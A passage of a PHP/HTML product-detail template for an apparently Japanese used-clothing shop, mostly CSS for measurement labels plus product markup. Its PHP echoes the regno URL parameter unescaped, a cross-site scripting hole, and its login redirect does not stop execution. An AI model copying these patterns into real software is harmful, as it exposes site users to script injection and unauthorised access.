            }

            .finishmeasurementvaluefront6_1 {
                left: 26.8%;
                bottom: 58.3%;
            }

            .finishmeasurementvaluefront9_1 {
                left: 26.8%;
                bottom: 46%;
            }

            .finishmeasurementvaluefront12_1 {
                left: 26.8%;
                bottom: 33.2%;
            }

            .finishmeasurementvaluefront10_1 {
                left: 45%;
                bottom: 55.4%;
            }

            .finishmeasurementvaluefront11_1 {
                left: 45.2%;
                bottom: 44.6%;
            }

            .finishmeasurementvaluefront8_1 {
                left: 13.2%;
                bottom: 56.9%;
            }

            .finishmeasurementvaluefront7_1 {
                bottom: 66.8%;
                left: 6.9%;
            }

            .finishmeasurementvaluefront13_1 {
                left: 19.4%;
                bottom: 28.6%;
            }

            .finishmeasurementvaluefront14_1 {
                bottom: 62.9%;
                left: 14.6%;
            }

            .finishmeasurementvalueback15_1 {
                left: 70.8%;
                bottom: 87.2%;
                font-size: 7px;
            }

            .finishmeasurementvalueback16_1 {
                left: 82.5%;
                bottom: 87.6%;
            }

            .finishmeasurementvalueback17_1 {
                left: 70.4%;
                bottom: 80.6%;
            }

            .finishmeasurementvalueback18_1 {
                bottom: 71.8%;
                left: 70.4%;
            }

            .finishmeasurementvalueback19_1 {
                bottom: 66.4%;
                left: 70.8%;
            }

            .finishmeasurementvalueback20_1 {
                bottom: 58.3%;
                left: 70.8%;

            }

            .finishmeasurementvalueback27_1 {
                bottom: 51.3%;
                left: 70.8%;
            }

            .finishmeasurementvalueback24_1 {
                bottom: 43.8%;
                left: 70.2%;
            }

            .finishmeasurementvalueback25_1 {
                bottom: 34.8%;
                left: 70%;
            }

            .finishmeasurementvalueback22_1 {
                bottom: 52%;
                left: 55%;
            }

            .finishmeasurementvalueback26_1 {
                bottom: 27.15%;
                left: 74.3%;
            }

            .finishmeasurementvalueback21_1 {
                left: 88.2%;
                bottom: 64.8%;
            }

            .finishmeasurementvalueback23_1 {
                bottom: 46.4%;
                left: 85.5%;
            }

            /* #cmn_btn {
                margin-bottom: 15%;
            } */
            .section-space-mt {
                margin-top: 134px !important;
            }

            .ec-vendor-card-body {
                padding: 15px !important;
            }

            #content_body {
                padding-bottom: 10% !important;
            }
        }

        @media screen and (min-width: 700px)and (max-width: 750px) {
            .finishmeasurementvaluefront1 {
                position: absolute;
                left: 19%;
                bottom: 85.2%;
                font-size: 9px;
            }

            .finishmeasurementvaluefront2 {
                position: absolute;
                left: 28.5%;
                bottom: 87.4%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront3 {
                position: absolute;
                left: 31.5%;
                bottom: 71.8%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront4 {
                position: absolute;
                left: 18.3%;
                bottom: 68.6%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront5 {
                position: absolute;
                left: 18.3%;
                bottom: 60%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront6 {
                position: absolute;
                left: 18.8%;
                bottom: 49%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront9 {
                position: absolute;
                left: 18.6%;
                bottom: 31%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront12 {
                position: absolute;
                left: 18.5%;
                bottom: 13.7%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront10 {
                position: absolute;
                left: 32.5%;
                bottom: 44.8%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront11 {
                position: absolute;
                left: 32.5%;
                bottom: 29.4%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront8 {
                position: absolute;
                left: 8.5%;
                bottom: 47.5%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront7 {
                position: absolute;
                bottom: 60.2%;
                left: 4%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront13 {
                position: absolute;
                left: 13%;
                bottom: 7.5%;
                font-size: 10px;
            }

            .finishmeasurementvaluefront14 {
                position: absolute;
                bottom: 55.1%;
                left: 10%;
                font-size: 10px;
            }

            .finishmeasurementvalueback15 {
                position: absolute;
                left: 51%;
                bottom: 89%;
                font-size: 9px;
            }

            .finishmeasurementvalueback16 {
                position: absolute;
                left: 60.4%;
                bottom: 89.3%;
                font-size: 10px;
            }

            .finishmeasurementvalueback17 {
                position: absolute;
                left: 51%;
                bottom: 79.8%;
                font-size: 10px;
            }

            .finishmeasurementvalueback18 {
                position: absolute;
                bottom: 66.9%;
                left: 51%;
                font-size: 10px;
            }

            .finishmeasurementvalueback19 {
                position: absolute;
                bottom: 60.5%;
                left: 51%;
                font-size: 10px;
            }

            .finishmeasurementvalueback20 {
                position: absolute;
                bottom: 48.9%;
                left: 51%;
                font-size: 10px;
            }

            .finishmeasurementvalueback27 {
                position: absolute;
                bottom: 39%;
                left: 51%;
                font-size: 10px;
            }

            .finishmeasurementvalueback24 {
                position: absolute;
                bottom: 28.3%;
                left: 51%;
                font-size: 10px;
            }

            .finishmeasurementvalueback25 {
                position: absolute;
                bottom: 16%;
                left: 51%;
                font-size: 10px;
            }

            .finishmeasurementvalueback22 {
                position: absolute;
                bottom: 40.1%;
                left: 40%;
                font-size: 10px;
            }

            .finishmeasurementvalueback26 {
                position: absolute;
                bottom: 5.8%;
                left: 54%;
                font-size: 10px;
            }

            .finishmeasurementvalueback21 {
                position: absolute;
                left: 64.4%;
                bottom: 57.7%;
                font-size: 10px;
            }

            .finishmeasurementvalueback28 {
                position: absolute;
                bottom: 33.55%;
                left: 54%;
                font-size: 10px;
            }

            .finishmeasurementvalueback23 {
                position: absolute;
                bottom: 32%;
                left: 62.4%;
                font-size: 10px;
            }
        }

        @media screen and (min-width: 360px) and (max-width: 385px) {
            .finishmeasurementvaluefront8 {
                left: 14.8% !important;
                bottom: 47.6% !important;
                font-weight: bold;
                color: black;

            }
        }

        @media screen and (min-width: 800px)and (max-width: 1400px) {

            #cmn_btn {
                width: 190px !important;
            }
        }

        @media screen and (min-width:1900px) {
            .finishmeasurementvaluefront1 {
                left: 25%;
                bottom: 69.2%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront1_1 {
                left: 29.8%;
                bottom: 69.2%;
                font-size: 14px;
            }


            .finishmeasurementvaluefront2 {
                left: 38.4%;
                bottom: 72%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront2_1 {
                left: 45.2%;
                bottom: 71.8%;
                font-size: 14px;
            }


            .finishmeasurementvaluefront3 {
                left: 42.4%;
                bottom: 60.2%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront3_1 {
                left: 50.2%;
                bottom: 58%;
                font-size: 14px;
            }


            .finishmeasurementvaluefront4 {
                left: 25.3%;
                bottom: 59.9%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront4_1 {
                left: 29.8%;
                bottom: 58.8%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront5 {
                left: 25.3%;
                bottom: 54.9%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront5_1 {
                left: 29.8%;
                bottom: 53%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront6 {
                left: 24.6%;
                bottom: 46.6%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront6_1 {
                left: 29.8%;
                bottom: 43%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront9 {
                left: 25.3%;
                bottom: 34%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront9_1 {
                left: 30.4%;
                bottom: 28.8%;
                font-size: 14px;
            }


            .finishmeasurementvaluefront12 {
                left: 25.5%;
                bottom: 17.4%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront12_1 {
                left: 30.4%;
                bottom: 16.4%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront10 {
                left: 42.2%;
                bottom: 43.2%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront10_1 {
                left: 50.4%;
                bottom: 39.4%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront11 {
                left: 42%;
                bottom: 34.8%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront11_1 {
                left: 50.2%;
                bottom: 30.2%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront8 {
                left: 13.6%;
                bottom: 45%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront8_1 {
                left: 16.2%;
                bottom: 41.2%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront7 {
                bottom: 54%;
                left: 6.9%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront7_1 {
                bottom: 51%;
                left: 8.6%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront13 {
                left: 31.4%;
                bottom: 17.2%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront13_1 {
                left: 37.4%;
                bottom: 11%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront14 {
                bottom: 49.6%;
                left: 14.2%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront14_1 {
                bottom: 47%;
                left: 16.9%;
                font-size: 14px;
            }

            .finishmeasurementvalueback15 {
                bottom: 73.6%;
                left: 70.4%;
                font-size: 12px;
            }

            .finishmeasurementvalueback15_1 {
                left: 84.2%;
                bottom: 73.2%;
                font-size: 14px;
            }

            .finishmeasurementvalueback16 {
                left: 82.8%;
                bottom: 74.3%;
                font-size: 12px;
            }

            .finishmeasurementvalueback16_1 {
                left: 98.8%;
                bottom: 73.4%;
                font-size: 14px;
            }

            .finishmeasurementvalueback17 {
                left: 70.4%;
                bottom: 67.6%;
                font-size: 12px;
            }

            .finishmeasurementvalueback17_1 {
                left: 83.6%;
                bottom: 67.2%;
                font-size: 14px;
            }

            .finishmeasurementvalueback18 {
                bottom: 59.7%;
                left: 70.4%;
                font-size: 12px;
            }

            .finishmeasurementvalueback18_1 {
                bottom: 57.4%;
                left: 83.6%;
                font-size: 14px;
            }

            .finishmeasurementvalueback19 {
                bottom: 54.8%;
                left: 71%;
                font-size: 12px;
            }

            .finishmeasurementvalueback19_1 {
                bottom: 52.2%;
                left: 83.8%;
                font-size: 14px;
            }

            .finishmeasurementvalueback20 {
                bottom: 46.6%;
                left: 71%;
                font-size: 12px;
            }

            .finishmeasurementvalueback20_1 {
                bottom: 43.2%;
                left: 84.4%;
                font-size: 14px;
            }

            .finishmeasurementvalueback27 {
                bottom: 41%;
                left: 71%;
                font-size: 12px;
            }

            .finishmeasurementvalueback27_1 {
                bottom: 37.2%;
                left: 84.4%;
                font-size: 14px;
            }

            .finishmeasurementvalueback24 {
                bottom: 34.3%;
                left: 71%;
                font-size: 12px;
            }

            .finishmeasurementvalueback24_1 {
                bottom: 28.8%;
                left: 84.4%;
                font-size: 14px;
            }

            .finishmeasurementvalueback25 {
                bottom: 22.9%;
                left: 70.6%;
                font-size: 12px;
            }

            .finishmeasurementvalueback25_1 {
                bottom: 16.6%;
                left: 84.4%;
                font-size: 14px;
            }

            .finishmeasurementvalueback22 {
                bottom: 39.8%;
                left: 57%;
                font-size: 12px;
            }

            .finishmeasurementvalueback22_1 {
                bottom: 35.8%;
                left: 68.2%;
                font-size: 14px;
            }

            .finishmeasurementvalueback26 {
                bottom: 13.2%;
                left: 75.4%;
                font-size: 12px;
            }

            .finishmeasurementvalueback26_1 {
                bottom: 6.6%;
                left: 90.2%;
                font-size: 14px;
            }

            .finishmeasurementvalueback21 {
                left: 87.2%;
                bottom: 53.7%;
                font-size: 12px;
            }

            .finishmeasurementvalueback21_1 {
                left: 104.6%;
                bottom: 51.15%;
                font-size: 14px;
            }

            .finishmeasurementvalueback28 {
                bottom: 37.2%;
                left: 74.6%;
                font-size: 12px;
            }

            .finishmeasurementvalueback28_1 {
                bottom: 32.8%;
                left: 89%;
                font-size: 14px;
            }

            .finishmeasurementvalueback23 {
                bottom: 40%;
                left: 84.4%;
                font-size: 12px;
            }

            .finishmeasurementvalueback23_1 {
                bottom: 36%;
                left: 100.2%;
                font-size: 14px;
            }

            .finishmeasurementvaluefront29 {
                bottom: 65.6%;
                left: 7.4%;
                font-size: 12px;
            }

            .finishmeasurementvaluefront29_1 {
                bottom: 64.8%;
                left: 8.8%;
                font-size: 13px;
            }

            .finishmeasurementvaluedoublewidth {
                bottom: 13.2%;
                left: 31.4%;
                font-size: 12px;
            }

            .finishmeasurementvaluedoublewidth_1 {
                bottom: 6.8%;
                left: 37.4%;
                font-size: 13px;
            }
        }

        .sold-tag{
            display:none;
        }


    </style>

</head>
<?php
if (!isset($_SESSION['Login']) && empty($_SESSION['Login'])) {
    header('location:Login.php');
}

$data_array =  array("visitor_no" => $_SESSION['Visitor_no']);
$make_call = callAPI('POST', 'view/userprofile', json_encode($data_array));
$response = json_decode($make_call, true);
$response_status = $response['APISTATUS']['status'];
if ($response_status == 0) {
    $unickname = $response['ENTITY_LIST'][0]['nickname'];
}

?>

<body class="product_page">
    <div id="ec-overlay"><span class="loader_img"></span></div>

    <!-- Header start  -->
    <div id="header"></div>
    <!-- Header End  -->

    <!-- Ec breadcrumb start -->
    <div class="sticky-header-next-sec ec-breadcrumb section-space-mb">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="row ec_breadcrumb_inner">
                        <div class="col-md-6 col-sm-12">
                            <!-- ec-breadcrumb-list start -->
                            <ul class="ec-breadcrumb-list">
                                <?php if (
                                    isset($_SESSION['Login']) &&
                                    !empty($_SESSION['Login'])
                                ) { ?>
                                    <li class="ec-breadcrumb-item"><a href="home.php">ホーム</a></li>
                                <?php } else { ?>
                                    <li class="ec-breadcrumb-item"><a href="home.php">ホーム</a></li>
                                <?php } ?>
                                <li class="ec-breadcrumb-item
                                active">商品詳細 </li>
                            </ul>
                            <!-- ec-breadcrumb-list end -->
                        </div>
                        <div class="col-md-6 col-sm-12">
                            <span>
                                <a href="javascript:window.history.back()">
                                    <img src="../assets/images2/icons/istockphoto-1385686401-170667a-removebg-preview.png" width="20" height="20" class="mobilebackbtn" /></a>
                            </span>
                            <h2 class="ec-breadcrumb-title">商品詳細</h2>
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Ec breadcrumb end -->

    <!-- Back Button Link  -->
    <a href="category.php">
    </a>

    <?php
    // $data_array =  array("registerno" => $_GET["regno"]);
    // $make_call = callAPI('POST', 'view/productdetailsinfo', json_encode($data_array));
    // $response = json_decode($make_call, true);
    // if (!$response) {
    //     $msg = "connection failed";
    // } else {

    //     $details = $response['ENTITY_LIST'];
    //     // print_r($details);
    //     foreach ($details as $value) {
    //         $chart_no = $value['chartno'];
    //         $line_no = $value['lineno'];
    //         $thing_no = $value['thingno'];
    //         $reg_no = $value['registerno'];
    //         $imgsrc = $value['coverimage'];
    //     }
    // }
    ?>

    <!-- Start Single product -->
    <section class="ec-page-content ec-vendor-uploads ec-user-accounsection-space-p">
        <div class="container">
            <div class="row mt-2">
                <div class="ec-shop-leftside ec-vendor-sidebar col-lg-3 col-md-12" id="sidebar-main-div">
                    <div class="ec-sidebar-wrap">
                        <!-- Sidebar Category Block -->
                        <div id="sidebar_content"></div>
                    </div>
                </div>
                <div class="ec-shop-rightside col-lg-9 col-md-12">
                    <div class="ec-vendor-dashboard-card ec-vendor-setting-card">
                        <div class="ec-vendor-card-body" id="content_body">
                            <div class="row">
                                <div class="ec-pro-rightside ec-common-rightside col-lg-12 col-md-12">
                                    <!-- Single product content Start -->
                                    <div class="single-pro-block">
                                        <div class="single-pro-inner">
                                            <div class="row">
                                                <div class="single-pro-img single-pro-img-no-sidebar">
                                                    <div class="single-product-scroll">
                                                        <div class="single-product-cover">
                                                            <div class="single-slide zoom-image-hover">
                                                                <svg width="150" height="150" class="sold-tag" id="sold" style="position: absolute;top: 0%;z-index: 9;" viewBox="0 0 122 122" fill="none" xmlns="http://www.w3.org/2000/svg"><title><!----><!----></title><path fill-rule="evenodd" clip-rule="evenodd" d="M0 0H122L0 122V0Z" fill="#FF0211"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M19.6967 58.6067C19.0862 58.527 18.4226 58.6133 17.706 58.8655C16.9893 59.1176 16.3854 59.4892 15.8944 59.9803C15.6024 60.2723 15.3469 60.6008 15.1279 60.9657C14.9089 61.3307 14.7563 61.709 14.67 62.1005C14.5838 62.492 14.5871 62.8868 14.68 63.285C14.7729 63.6831 14.9919 64.0548 15.3369 64.3998C15.6555 64.7183 15.9939 64.9241 16.3522 65.017C16.7106 65.1099 17.0855 65.1198 17.477 65.0468C17.8685 64.9738 18.2899 64.8312 18.7412 64.6188C19.1924 64.4065 19.6768 64.1609 20.1944 63.8822C20.7917 63.577 21.4254 63.275 22.0956 62.9764C22.7659 62.6778 23.456 62.4787 24.166 62.3792C24.8761 62.2796 25.5928 62.3327 26.3161 62.5384C27.0394 62.7442 27.7461 63.1921 28.4363 63.8822C29.1928 64.6387 29.7137 65.4383 29.999 66.2811C30.2844 67.1239 30.3806 67.9633 30.2877 68.7994C30.1948 69.6356 29.9293 70.4584 29.4914 71.268C29.0534 72.0776 28.4893 72.8274 27.7992 73.5176C26.8834 74.4333 25.8184 75.16 24.604 75.6975C23.3896 76.235 22.1719 76.4507 20.9509 76.3445L21.0704 72.8805C21.8932 73.0133 22.7327 72.9303 23.5887 72.6317C24.4448 72.3331 25.1515 71.9051 25.7089 71.3476C26.0009 71.0557 26.263 70.7205 26.4952 70.3423C26.7275 69.964 26.8801 69.5659 26.9531 69.1478C27.0261 68.7298 27.0095 68.315 26.9034 67.9036C26.7972 67.4922 26.5517 67.094 26.1668 66.7091C25.7952 66.3375 25.4003 66.1152 24.9823 66.0422C24.5642 65.9692 24.1196 65.9891 23.6484 66.1019C23.1773 66.2147 22.6763 66.4039 22.1454 66.6693L20.4731 67.5054C19.9157 67.7974 19.3318 68.0629 18.7213 68.3017C18.1108 68.5406 17.4837 68.6767 16.84 68.7099C16.1963 68.743 15.546 68.6435 14.889 68.4112C14.2321 68.179 13.5718 67.7311 12.9082 67.0675C12.1915 66.3508 11.7237 65.5843 11.5047 64.7681C11.2857 63.9519 11.2492 63.1324 11.3952 62.3095C11.5412 61.4866 11.8398 60.6837 12.2911 59.9007C12.7423 59.1176 13.2864 58.4076 13.9235 57.7705C14.6402 57.0539 15.4929 56.4533 16.4816 55.9689C17.4704 55.4845 18.489 55.2223 19.5375 55.1825L19.6967 58.6067ZM27.9235 58.5023C26.7953 57.3742 25.9659 56.1664 25.435 54.8791C24.9041 53.5917 24.6553 52.2944 24.6884 50.9871C24.7216 49.6798 25.0269 48.3924 25.6042 47.125C26.1815 45.8575 27.0143 44.6796 28.1026 43.5913C29.2042 42.4898 30.392 41.647 31.6661 41.0631C32.9402 40.4791 34.2342 40.1672 35.5481 40.1274C36.8621 40.0876 38.1627 40.3331 39.4501 40.864C40.7374 41.3949 41.9452 42.2243 43.0733 43.3525C44.1748 44.454 44.991 45.6485 45.5219 46.9358C46.0528 48.2232 46.3083 49.5338 46.2884 50.8676C46.2685 52.2015 45.9765 53.5154 45.4124 54.8094C44.8484 56.1034 44.0156 57.3012 42.914 58.4027C41.8257 59.491 40.6379 60.3139 39.3505 60.8713C38.0631 61.4287 36.7559 61.7141 35.4287 61.7273C34.1015 61.7406 32.7942 61.4818 31.5069 60.9509C30.2195 60.42 29.025 59.6038 27.9235 58.5023ZM30.6508 55.7748C31.4073 56.5313 32.2169 57.1087 33.0796 57.5068C33.9423 57.905 34.8215 58.1206 35.7174 58.1538C36.6132 58.187 37.4858 58.0377 38.3352 57.7059C39.1846 57.3741 39.9677 56.8499 40.6843 56.1332C41.401 55.4165 41.9286 54.6302 42.267 53.7741C42.6055 52.9181 42.7581 52.0421 42.7249 51.1463C42.6917 50.2504 42.4761 49.3712 42.0779 48.5085C41.6797 47.6458 41.1024 46.8363 40.3459 46.0798C39.616 45.3498 38.823 44.7891 37.9669 44.3976C37.1109 44.006 36.2383 43.7904 35.3491 43.7506C34.4598 43.7107 33.5839 43.8567 32.7212 44.1885C31.8586 44.5203 31.0623 45.0512 30.3323 45.7811C29.6024 46.5111 29.0748 47.3041 28.7496 48.1601C28.4245 49.0162 28.2818 49.8888 28.3216 50.778C28.3614 51.6672 28.5771 52.5398 28.9686 53.3959C29.3601 54.2519 29.9209 55.0449 30.6508 55.7748ZM39.0967 33.3141L41.6051 30.8057L53.4701 42.6707L59.4623 36.6785L61.692 38.9081L53.1914 47.4088L39.0967 33.3141ZM49.8717 22.539L54.8685 17.5421C55.7843 16.6264 56.8261 15.8234 57.994 15.1333C59.162 14.4431 60.3929 14.0019 61.6869 13.8094C62.981 13.617 64.3081 13.7364 65.6685 14.1678C67.0289 14.5991 68.3726 15.4783 69.6998 16.8055C70.9341 18.0398 71.7636 19.3338 72.1883 20.6875C72.613 22.0413 72.7391 23.3751 72.5665 24.689C72.394 26.0029 71.9793 27.2604 71.3223 28.4615C70.6653 29.6626 69.879 30.7211 68.9632 31.6368L63.9664 36.6337L49.8717 22.539ZM66.3753 29.8452C67.0256 29.1949 67.5996 28.4682 68.0973 27.6653C68.595 26.8623 68.9235 26.0163 69.0827 25.127C69.242 24.2378 69.1756 23.3154 68.8837 22.3599C68.5917 21.4043 67.9679 20.4487 67.0123 19.4931C66.0037 18.4845 65.0149 17.8275 64.0461 17.5223C63.0772 17.217 62.1515 17.1473 61.2689 17.3132C60.3863 17.4791 59.5535 17.8209 58.7705 18.3385C57.9875 18.8561 57.2708 19.44 56.6205 20.0904L54.5301 22.1807L64.285 31.9355L66.3753 29.8452Z" fill="white"></path></svg>
                                                                <img id="dataimg" class="img-responsive" src="" alt="" />
                                                            </div>
                                                        </div>
                                                        <center><b><span id="img_no">1</span>/<span id="imgcount">1</span></b></center>
                                                        <!-- <div class="single-nav-thumb"> -->
                                                        <div id="" class="">
                                                            <a class="previous" id="prev" onclick="Prev()" style="color: #662d91;">
                                                                <svg style="width:25px;height:25px;margin-top:175%" viewBox="0 0 24 24" id="previous1">
                                                                    <path fill="#662d91" d="M22,12A10,10 0 0,1 12,22A10,10 0 0,1 2,12A10,10 0 0,1 12,2A10,10 0 0,1 22,12M15.4,16.6L10.8,12L15.4,7.4L14,6L8,12L14,18L15.4,16.6Z" />
                                                                </svg>

                                                            </a>
                                                            <a class="Next" id="next" onclick="Next()" style="color: #662d91;">
                                                                <svg style="width:25px;height:25px;margin-top:175%" viewBox="0 0 24 24" id="Next1">
                                                                    <path fill="#662d91" d="M22,12A10,10 0 0,1 12,22A10,10 0 0,1 2,12A10,10 0 0,1 12,2A10,10 0 0,1 22,12M10,18L16,12L10,6L8.6,7.4L13.2,12L8.6,16.6L10,18Z" />
                                                                </svg>

                                                            </a>
                                                        </div>
                                                        <div id="imageDiv">

                                                            <!-- <div class="single-slide"> -->
                                                            <img class="img-responsive" src="" alt="" />
                                                            <!-- </div> -->
                                                            <!-- </div> -->
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="single-pro-desc single-pro-desc-no-sidebar">
                                                    <div class="single-pro-content">
                                                        <h5 class="ec-single-title">登録番号：<?php echo $_GET["regno"] ?>
                                                        </h5>
                                                        <h5 class="ec-single-title" id="prodName"></h5>
                                                        <div class="ec-single-price-stoke">
                                                            <div class="ec-single-price">
                                                                <b>販売価格</b>
                                                                <span class="new-price" id="sellingPrice" style="color:indigo!important;"></span>
                                                            </div>
                                                        </div>
                                                        <div style="background-color:lightgrey;padding:2%;">
                                                            <b>商品の情報</b>
                                                        </div><br>
                                                        <div class="ec-single-desc">商品名：<span id="classificationName"></span></div>
                                                        <div class="ec-single-desc">ブランド：<span id="brand"></span></div>
                                                        <div class="ec-single-desc">カテゴリー：<span id="category"></span>
                                                        </div>
                                                        <div class="ec-single-desc">色：<span id="color"></span></div>
                                                        <div class="ec-single-desc">表地：<span id="material"></span></div>
                                                        <div class="ec-single-desc">裏地：<span id="lining"></span></div>
                                                        <div class="row">
                                                            <div class="ec-single-desc columns" id="size-left-div">
                                                                商品サイズ：<span id="size"></span></div>
                                                            <div class="columns right">
                                                                <p class="zoom-btn" style="color: white;"><svg style="width:21px;height:19px" viewBox="0 0 24 24" class="zoom-in-svg">
                                                                        <path fill="currentColor" d="M9,2A7,7 0 0,1 16,9C16,10.57 15.5,12 14.61,13.19L15.41,14H16L22,20L20,22L14,16V15.41L13.19,14.61C12,15.5 10.57,16 9,16A7,7 0 0,1 2,9A7,7 0 0,1 9,2M8,5V8H5V10H8V13H10V10H13V8H10V5H8Z" />
                                                                    </svg>
                                                                    <svg style="width:21px;height:19px" viewBox="0 0 24 24" class="zoom-out-svg display">
                                                                        <path fill="currentColor" d="M9,2A7,7 0 0,1 16,9C16,10.57 15.5,12 14.61,13.19L15.41,14H16L22,20L20,22L14,16V15.41L13.19,14.61C12,15.5 10.57,16 9,16A7,7 0 0,1 2,9A7,7 0 0,1 9,2M5,8V10H13V8H5Z" />
                                                                    </svg>
                                                                </p>
                                                                <p class="zoom-mob" id="zoom-modal" style="color: white;"><svg style="width:21px;height:19px" viewBox="0 0 24 24" class="zoom-in-svg">
                                                                        <path fill="currentColor" d="M9,2A7,7 0 0,1 16,9C16,10.57 15.5,12 14.61,13.19L15.41,14H16L22,20L20,22L14,16V15.41L13.19,14.61C12,15.5 10.57,16 9,16A7,7 0 0,1 2,9A7,7 0 0,1 9,2M8,5V8H5V10H8V13H10V10H13V8H10V5H8Z" />
                                                                    </svg>
                                                                    <svg style="width:21px;height:19px" viewBox="0 0 24 24" class="zoom-out-svg display">
                                                                        <path fill="currentColor" d="M9,2A7,7 0 0,1 16,9C16,10.57 15.5,12 14.61,13.19L15.41,14H16L22,20L20,22L14,16V15.41L13.19,14.61C12,15.5 10.57,16 9,16A7,7 0 0,1 2,9A7,7 0 0,1 9,2M5,8V10H13V8H5Z" />
                                                                    </svg>
                                                                </p>
                                                            </div>
                                                        </div>
                                                        <div class="row">
                                                            <div class="col-md-10" id="sizeimagediv">
                                                                <img src="../assets/images2/common/karteafter.jpg" class="size-img-prod" id="kartefter-div">
                                                                <div class="finishmeasurementvaluefront1" id="1"></div>
                                                                <div class="finishmeasurementvaluefront2" id="2"></div>
                                                                <div class="finishmeasurementvaluefront3" id="3"></div>
                                                                <div class="finishmeasurementvaluefront4" id="4"></div>
                                                                <div class="finishmeasurementvaluefront5" id="5"></div>
                                                                <div class="finishmeasurementvaluefront6" id="6"></div>
                                                                <div class="finishmeasurementvaluefront9" id="9"></div>
                                                                <div class="finishmeasurementvaluefront12" id="12">
                                                                </div>
                                                                <div class="finishmeasurementvaluefront10" id="10">
                                                                </div>
                                                                <div class="finishmeasurementvaluefront11" id="11">
                                                                </div>
                                                                <div class="finishmeasurementvaluefront8" id="8"></div>
                                                                <div class="finishmeasurementvaluefront7" id="7"></div>
                                                                <div class="finishmeasurementvaluefront13" id="13">
                                                                </div>
                                                                <div class="finishmeasurementvaluefront14" id="14">
                                                                </div>
                                                                <div class="finishmeasurementvaluefront29" id="29"></div>
                                                                <div class="finishmeasurementvaluedoublewidth" id="doublewidth"></div>
                                                                <div class="finishmeasurementvalueback15" id="15"></div>
                                                                <div class="finishmeasurementvalueback16" id="16"></div>
                                                                <div class="finishmeasurementvalueback17" id="17"></div>
                                                                <div class="finishmeasurementvalueback18" id="18"></div>
                                                                <div class="finishmeasurementvalueback19" id="19"></div>
                                                                <div class="finishmeasurementvalueback20" id="20"></div>
                                                                <div class="finishmeasurementvalueback27" id="27"></div>
                                                                <div class="finishmeasurementvalueback24" id="24"></div>
                                                                <div class="finishmeasurementvalueback25" id="25"></div>
                                                                <div class="finishmeasurementvalueback22" id="22"></div>
                                                                <div class="finishmeasurementvalueback26" id="26"></div>
                                                                <div class="finishmeasurementvalueback21" id="21"></div>
                                                                <div class="finishmeasurementvalueback28" id="28"></div>
                                                                <div class="finishmeasurementvalueback23" id="23"></div>
                                                                <img src="../assets/images2/common/karteafter.jpg" class="size-hide-product display" style="width:120%;height:100%;max-width:130%;position:relative;">
                                                            </div>
                                                        </div>
                                                        <br/>
                                                        <br/>
                                                        <div id="size-modal" style = "text-align:center;">
                                                            <span class="size-table"><b><u>採寸の詳細はこちら</u></b></span>
                                                        </div>
                                                        <br/>
                                                        <div class="ec-single-desc">商品の状態：<span id="condition"></span>
                                                        <span id="size-tb" class="size-table"><b><u>(状態表示について)</u></b></span>
                                                        </div>
                                                        <div class="ec-single-desc">商品の名称：<span id="prodDetail" style="white-space: pre-line;"></span>
                                                        </div>
                                                        <div class="ec-single-desc">商品の説明：<span id="prodDesc" style="white-space: pre-line; display:block;"></span>
                                                        </div>
                                                        <div class="ec-single-desc">出品者： <span id="userNickname"></span>
                                                        </div>
                                                        <div class="ec-single-desc" id="shipmentId">発送元： <span id="shipmentSource"></span></div>
                                                        <!-- <div class="ec-single-desc" id="unamelbl" style="display: none;">購入者名：<span id="uname"></span></div>
                                                        <div class="ec-single-desc" id="addresslbl" style="display: none;">住所：<span id="address"></span></div> -->
                                                        <!-- <div class="ec-pro-variation">
                                                            <div class="ec-pro-variation-inner ec-pro-variation-size">
                                                            </div>
                                                        </div> -->
                                                        <div class="ec-single-qty">
                                                            <div class="ec-single-cart" id="checkoutbtndiv" style="display:none;">
                                                                <button class="btn btn-primary common_btn" id="checkoutbtn" style="width:110%;">カートに入れる</button>
                                                            </div>
                                                            <!-- <div class="ec-single-wishlist" id="wishlistbtn">
                                                                <a class="ec-btn-group wishlist" title="お気に入り">
                                                                    <img id="wishlistbtn" src="../assets/images/icons/wishlist.svg" class="svg_img pro_svg wishlistbtntxt" alt="" /></a>
                                                            </div> -->
                                                            <div class="ec-pro-actions">

                                                                <a class="ec-btn-group wishlist" id="wishlistbtn" title=" お気に入り" style="display:none;">

                                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="svg_img pro_svg" fill="white" stroke="#686868" stroke-width="1.5" alt="" id="wishlist_svg">
                                                                        <path d="M12 4.248c-3.148-5.402-12-3.825-12 2.944 0 4.661 5.571 9.427 12 15.808 6.43-6.381 12-11.147 12-15.808 0-6.792-8.875-8.306-12-2.944z" />
                                                                    </svg>
                                                                </a>
